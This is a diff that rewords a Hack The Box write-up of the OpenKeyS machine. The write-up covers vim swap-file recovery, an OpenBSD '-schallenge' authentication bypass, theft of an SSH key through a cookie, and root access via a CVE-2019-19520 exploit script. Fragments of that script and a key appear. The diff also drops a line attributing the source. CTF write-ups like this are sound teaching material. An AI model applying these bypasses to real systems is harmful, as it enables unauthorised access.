@@ -6,9 +6,9 @@ points: 30
 rating: 3.8
 date: 2020-07-25
 avatar: assets/htb/openkeys.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/OpenKeyS
 ---
+
 ## Useful Skills and Tools
 
 #### Recover a file from a vim .swp file
@@ -19,7 +19,7 @@ htb_url: https://app.hackthebox.com/machines/OpenKeyS
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off by running nmap against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire nmap's default enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to write the results out under the base filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/openkeys]
@@ -98,15 +98,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 717.23 seconds
 ```
 
-Only two ports open, 22 - SSH and 80 - HTTP
+Just two open ports: 22 for SSH and 80 for HTTP.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-port-80.png)
+![](assets/wu/openkeys/img-1.png)
 
-HTTP leads to login page
+The web server presents a login page.
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-dirbuster%2520%25281%2529.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-includes.png)
+![](assets/wu/openkeys/img-3.png)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/openkeys]
@@ -136,20 +136,20 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-There wasn't anything to do with the login page so I ran gobuster on it, there was an `/includes` folder where I was able to download the files `auth.php` and `auth.php.swp`.  `Auth.php` didn't have anything in it so I tried the `.swp` file instead.
+With nothing obvious to do on the login page, I pointed gobuster at it. That surfaced an `/includes` directory from which I could grab `auth.php` and `auth.php.swp`.  Since `auth.php` was empty, I turned my attention to the `.swp` file.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-auth-php-swp.png)
+![](assets/wu/openkeys/img-4.png)
 
-Since I didn't know what it was, I opened the `.swp` file using vim and found a potential username `jennifer`, along with a file directory for `auth.php` and the hostname `openkeys.htb`.  Doing a little bit of research showed me that a `.swp` file was a vim recovery file.  I also found that I could get the file contents back using the directions from: [https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file](https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file)
+Not sure what it was, I opened the `.swp` file in vim and spotted a possible username `jennifer`, a path to `auth.php`, and the hostname `openkeys.htb`.  A bit of digging confirmed that a `.swp` file is a vim recovery file, and that I could restore its contents following the steps at: [https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file](https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ vim -r auth.php.swp
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-auth-php-swp-recovery.png)
+![](assets/wu/openkeys/img-5.png)
 
-Using the `-r` flag for vim I was able to recover the file `/var/www/htdocs/includes/auth.php` from the `.swp` file.
+With vim's `-r` flag I recovered `/var/www/htdocs/includes/auth.php` out of the `.swp` file.
 
 ```php
 <?php
@@ -194,13 +194,13 @@ function is_active_session()
 }
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-found-check_auth.png)
+![](assets/wu/openkeys/img-6.png)
 
-The `authenticate()` function stuck out to me since it pointed to a directory I hadn't found yet.  escapeshellcmd? `../auth_helpers/check_auth`
+The `authenticate()` function caught my eye because it referenced a directory I hadn't seen yet.  escapeshellcmd? `../auth_helpers/check_auth`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-check_auth.png)
+![](assets/wu/openkeys/img-7.png)
 
-By navigating to the path `http://<YOUR_IP>/../auth_helpers/check_auth` I was able to download the `check_auth` program.  \[Ignore the fact that it looks like this is on the `/includes` page, when it loaded the file to download there was no HTML to display.\]
+Browsing to `http://<YOUR_IP>/../auth_helpers/check_auth` let me download the `check_auth` binary.  \[Disregard that it appears to be on the `/includes` page; when the file downloaded there was no HTML to render.\]
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/openkeys]
@@ -208,15 +208,15 @@ By navigating to the path `http://<YOUR_IP>/../auth_helpers/check_auth` I was ab
 check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
 ```
 
-googled `/usr/libexec/ld.so` - [https://man.netbsd.org/libexec/ld.so.1](https://man.netbsd.org/libexec/ld.so.1)
+Searched for `/usr/libexec/ld.so` - [https://man.netbsd.org/libexec/ld.so.1](https://man.netbsd.org/libexec/ld.so.1)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-ld-so.png)
+![](assets/wu/openkeys/img-8.png)
 
-found exploit for this file on openbsd - [https://www.exploit-db.com/exploits/47780](https://www.exploit-db.com/exploits/47780)
+located an OpenBSD exploit relating to this - [https://www.exploit-db.com/exploits/47780](https://www.exploit-db.com/exploits/47780)
 
 > yields full root privileges.
 
-Will have to remember this one when I gain access to the machine
+Worth keeping in mind for once I have a foothold on the box.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/openkeys]
@@ -309,7 +309,7 @@ _end
 _DYNAMIC
 ```
 
-OpenBSD, /usr/libexec/ld.so, libc.so.95.1 looked like places to start investigating
+OpenBSD, /usr/libexec/ld.so, and libc.so.95.1 seemed like good leads to chase down.
 
 [https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/](https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/)
 
@@ -352,7 +352,7 @@ Connection closed by <YOUR_IP> port 22
 
 [https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html](https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html)
 
-So the system seemed like it was vulnerable, but I was still not sure how to exploit this to gain access
+So the host appeared vulnerable, though I still hadn't worked out how to leverage it for access.
 
 ## Road to User
 
@@ -365,19 +365,19 @@ So the system seemed like it was vulnerable, but I was still not sure how to exp
  authentication\), then the authentication is automatically successful and
  therefore bypassed.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-schallenge.png)
+![](assets/wu/openkeys/img-9.png)
 
-After logging in with the username and password `-schallenge` I got this page.  `sshkey.php` sounded very interesting.
+Logging in with both the username and password set to `-schallenge` landed me on this page.  `sshkey.php` looked very promising.
 
-Since it did not like this username, I tried different methods of specifying another username.  The only possibility I had at this time was `jennifer` \(and this still felt like a stretch since I had only seen it in the header of that swap file...\)
+Because it rejected that username, I experimented with various ways of supplying a different one.  My only candidate so far was `jennifer` \(which still felt like a long shot, given I'd only seen it in that swap file's header...\)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-schallenge-test-jennifer.png)
+![](assets/wu/openkeys/img-10.png)
 
-Putting the username in the cookie seemed like a good bet, and logging in with the bypass and doing this gave me a redirect on the login page
+Stuffing the username into the cookie looked worth a shot, and combining that with the auth bypass gave me a redirect on the login page.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-schallenge-jennifer.png)
+![](assets/wu/openkeys/img-11.png)
 
-After getting a valid logged in PHP session ID, I tried multiple ways of specifying the only username I had found. I was able to give the name in the cookie on the `sshkey.php` page and get a response back!
+Once I had a valid authenticated PHP session ID, I tried several ways of passing the one username I'd discovered. Supplying the name via the cookie on the `sshkey.php` page produced a response!
 
 ```text
 HTTP/1.1 200 OK
@@ -433,11 +433,11 @@ qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=<br />
 -----END OPENSSH PRIVATE KEY-----</p><a href='index.php'>Back to login page</a></div></body></html>
 ```
 
-The service gave me an SSH key for the user `jennifer`!
+The endpoint handed back an SSH key for the user `jennifer`!
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-schallenge-jennifer-key.png)
+![](assets/wu/openkeys/img-12.png)
 
-It was easier to copy the key from the web browser since it didn't have the extra formatting.
+Copying the key straight from the browser was simpler since it came without the extra formatting.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/openkeys]
@@ -455,7 +455,7 @@ jennifer@<YOUR_IP>'s password:
 └─$ chmod 600 jennifer.key 
 ```
 
-Always use protection when reusing other people's keys.
+Always use protection when reusing someone else's keys.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/openkeys]
@@ -487,7 +487,7 @@ Password:
 And you call yourself a Rocket Scientist!
 ```
 
-Instead of telling me failed password attempt, the machine taunted me, saying "And you call yourself a Rocket Scientist!".
+Rather than reporting a failed password, the box mocked me with "And you call yourself a Rocket Scientist!".
 
 ### User.txt
 
@@ -513,7 +513,7 @@ openkeys$ cat user.txt
 36ab************************2b10
 ```
 
-`jennifer` had the user.txt flag in the user's folder
+The user.txt flag sat in `jennifer`'s home directory.
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -534,7 +534,7 @@ Subject: *** SECURITY information for openkeys.htb ***
 openkeys.htb : Nov 12 09:00:44 : jennifer : user NOT in sudoers ; TTY=ttyp0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/ps -a
 ```
 
-The file `dead-letter` contained a message that looked like a notification to the admin that someone \(`jennifer`\) had tried to use `sudo` and failed due to not being in the `sudoers` file.  
+The `dead-letter` file held what looked like an alert to the admin that someone \(`jennifer`\) had attempted `sudo` and failed because they weren't in the `sudoers` file.  
 
 ```text
 openkeys$ cat /etc/sudoers
@@ -592,7 +592,7 @@ root    ALL=(ALL) SETENV: ALL
 www     ALL=(jennifer) NOPASSWD: /usr/local/otp/skey_gen
 ```
 
-In the `/etc/sudoers` file there was an interesting entry that let `www` run the `skey_gen` command as `jennifer`; too bad the wheel group was commented out...since this would have let me privesc
+The `/etc/sudoers` file had a notable line allowing `www` to run `skey_gen` as `jennifer`; unfortunately the wheel group entry was commented out...otherwise it would have given me a privesc path.
 
 ### Getting a shell
 
@@ -601,9 +601,9 @@ openkeys$ uname -a
 OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
 ```
 
-Version is OpenBSD 6.6 x64
+The version is OpenBSD 6.6 x64.
 
-searching for root exploit for this led to [https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot)
+Searching for a root exploit for this turned up [https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot)
 
 ```text
 #!/bin/sh
@@ -725,7 +725,7 @@ if [ "$target" = "yubikey" ]; then
 fi
 ```
 
-The exploit was a shell script that I wrote to a file. It didn't seem to need any configuring so I ran it to see what it would do.
+The exploit was a shell script, which I saved to a file. It appeared to require no configuration, so I just ran it to observe its behavior.
 
 How this exploit works:
 
@@ -854,7 +854,7 @@ auth-defaults:auth=passwd,skey:
 auth-ftp-defaults:auth-ftp=skey:
 ```
 
-Can use BSD's skey to login.
+BSD's skey can be used to log in.
 
 > [https://man.openbsd.org/skey.1](https://man.openbsd.org/skey.1) S/Key is a procedure for using one-time passwords to authenticate access to computer systems. It uses 64 bits of information transformed by the MD5, RIPEMD-160, or SHA1 algorithms. The user supplies the 64 bits in the form of 6 English words that are generated by a secure computer. This implementation of S/Key is RFC 2289 compliant.
 >
@@ -866,7 +866,7 @@ Can use BSD's skey to login.
 >
 > Password sequence numbers count backwards. You can enter the passwords using small letters, even though skey prints them capitalized.
 
-After verifying the type of authentication, then deleting and recreating the skey auth key, the exploit `su`'s to UID 0 \(root\) using skey as the authentication method.
+After confirming the authentication type, then removing and rebuilding the skey auth key, the exploit `su`'s to UID 0 \(root\) with skey as the authentication method.
 
 ### Root.txt
 
@@ -892,7 +892,7 @@ otp-md5 99 obsd91335
 S/Key Password:
 ```
 
-I had to enter the password the system had given me `EGG LARD GROW HOG DRAG LAIN`. After that I was given a `root` shell.  
+I supplied the password the script had handed me, `EGG LARD GROW HOG DRAG LAIN`, and was dropped into a `root` shell.  
 
 ```text
 openkeys# id && hostname                                                                        
